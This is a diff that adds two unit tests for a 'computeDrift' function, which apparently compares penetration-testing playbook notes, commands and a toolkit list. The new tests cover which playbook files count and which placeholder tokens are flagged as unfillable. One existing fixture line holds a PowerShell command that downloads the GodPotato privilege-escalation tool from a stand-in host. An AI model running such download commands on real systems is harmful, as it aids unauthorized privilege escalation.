@@ -106,4 +106,19 @@ describe('computeDrift', () => {
     const d = computeDrift([], [], [], [card(['iwr http://x/GodPotato-NET40.exe -o gp.exe'])], toolkit);
     expect(d.toolkitUnused).toEqual(['GodPotato-NET4.exe']);
   });
+
+  it('only the 00-06 playbooks count for noStep and reworded', () => {
+    const d = computeDrift(
+      [goal('g1', { file: '99 - Im Stuck.md', text: 'Gone' }, { file: 'New Credential Routine.md', text: 'Gone too' })],
+      [item('Try harder', '01-Playbook/99 - Im Stuck.md'), item('Spray it', '01-Playbook/New Credential Routine.md'), item('Kernel exploits')],
+      [], [], [],
+    );
+    expect(d.noStep.map((i) => i.text)).toEqual(['Kernel exploits']);
+    expect(d.reworded).toEqual([]);
+  });
+
+  it('unfillable lists only UPPER_SNAKE tokens', () => {
+    const d = computeDrift([], [], [cmd('a', 'x {7d49d726-3c21-4f05-99aa-fdc2c9474656} {name} {pos} {MY_TOKEN} {SUBNET_2}')], [], []);
+    expect(d.unfillable.map((u) => u.token)).toEqual(['MY_TOKEN', 'SUBNET_2']);
+  });
 });
